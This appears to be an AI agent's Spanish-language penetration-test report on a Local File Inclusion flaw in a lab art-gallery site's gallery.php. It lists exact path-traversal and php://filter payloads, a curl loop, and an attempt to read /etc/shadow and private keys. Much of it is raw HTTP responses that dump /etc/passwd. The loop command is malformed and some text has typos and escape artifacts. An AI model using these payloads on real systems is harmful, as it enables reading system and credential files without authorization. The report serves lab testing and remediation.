# Informe de LFI - 2026-04-18T08:44:53\n\nObjetivo: http://web.dev.local:8081\n\nResumen:\n- Parámetro vulnerable: page (gallery.php)\n- Vulnerabilidad: Local File Inclusion (LFI)\n- Evidencia: lectura de /etc/passwd en las respuestas (fragmentos incluidos)\n\nComandos ejecutados:\n
echo '<payloads>' > /tmp/payloads.txt  # payloads probados\nfor p in page file include view p; do curl http://web.dev.local:8081/gallery.php?=../../../../../../etc/passwd; done\n
Payloads que devolvieron /etc/passwd:\n- ../../../../../../etc/passwd\n- ../../../../../etc/passwd\n- ../../../../etc/passwd\n- ../../../etc/passwd\n
Pruebas adicionales (wrappers):\n- php://filter/read=convert.base64-encode/resource=/etc/passwd (probado sin exito para shadow)
\nHallazgos detallados:\n- La página gallery.php incluye dinámicamente el archivo indicado por el parámetro page sin sanitización adecuada. Se logr leer el contenido de /etc/passwd (fragmento):\n\n
\nImpacto:\n- Acceso a listados de usuarios del sistema (/etc/passwd). Esto confirma LFI en la aplicación.\n- Se intent leer /etc/shadow y claves privadas; no se obtuvieron en este paso (probado php://filter para base64 pero no se devolvin datos sensibles).\n\nRecomendaciones:\n1) No incluir archivos directamente desde input del usuario. Usar whitelist de plantillas permitidas.\n2) Normalizar y validar parámetros antes de usarlos en include/require.\n3) Evitar mostrar contenido de ficheros del sistema en respuestas.\n\nComandos y payloads exactos usados:\n- GET /gallery.php?page=../../../../../../etc/passwd\n- GET /gallery.php?page=../../../../../etc/passwd\n- GET /gallery.php?page=../../../../etc/passwd\n- GET /gallery.php?page=../../../etc/passwd\n- GET /gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd\n\nArchivo de salida: /app/reports/informe_kali_context_lfi_gpt5mini_2026-04-18T08:44:53.md\n
\n\n--- Raw excerpt ---\n
TRY:http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd CODE:200 SIZE:3418
URL:http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería - ../../../../../../etc/passwd</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .nav {
            background: #2d3748;
            padding: 15px 30px;
        }
        .nav a {
            color: white;
            text-decoration: none;
            margin-right: 20px;
            padding: 8px 15px;
            border-radius: 5px;
            transition: background 0.3s;
        }
        .nav a:hover {
            background: #4a5568;
        }
        .content {
            padding: 40px;
            min-height: 400px;
        }
        .error {
            background: #fed7d7;
            border: 1px solid #fc8181;
            color: #742a2a;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
        </header>

        <div class="nav">
            <a href="index.php">Inicio</a>
            <a href="gallery.php?page=modern">Arte Moderno</a>
            <a href="gallery.php?page=classic">Arte Clásico</a>
            <a href="gallery.php?page=abstract">Arte Abstracto</a>
            <a href="gallery.php?page=about">Acerca de</a>
        </div>

        <div class="content">
            root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        </div>
        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Laboratorio de Seguridad</p>
        </footer>
    </div>
</body>
</html>
----
FOUND:http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd
TRY:http://web.dev.local:8081/gallery.php?page=../../../../../etc/passwd CODE:200 SIZE:3415
URL:http://web.dev.local:8081/gallery.php?page=../../../../../etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería - ../../../../../etc/passwd</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .nav {
            background: #2d3748;
            padding: 15px 30px;
        }
        .nav a {
            color: white;
            text-decoration: none;
            margin-right: 20px;
            padding: 8px 15px;
            border-radius: 5px;
            transition: background 0.3s;
        }
        .nav a:hover {
            background: #4a5568;
        }
        .content {
            padding: 40px;
            min-height: 400px;
        }
        .error {
            background: #fed7d7;
            border: 1px solid #fc8181;
            color: #742a2a;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
        </header>

        <div class="nav">
            <a href="index.php">Inicio</a>
            <a href="gallery.php?page=modern">Arte Moderno</a>
            <a href="gallery.php?page=classic">Arte Clásico</a>
            <a href="gallery.php?page=abstract">Arte Abstracto</a>
            <a href="gallery.php?page=about">Acerca de</a>
        </div>

        <div class="content">
            root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        </div>
        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Laboratorio de Seguridad</p>
        </footer>
    </div>
</body>
</html>
----
FOUND:http://web.dev.local:8081/gallery.php?page=../../../../../etc/passwd
TRY:http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd CODE:200 SIZE:3412
URL:http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería - ../../../../etc/passwd</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
\n
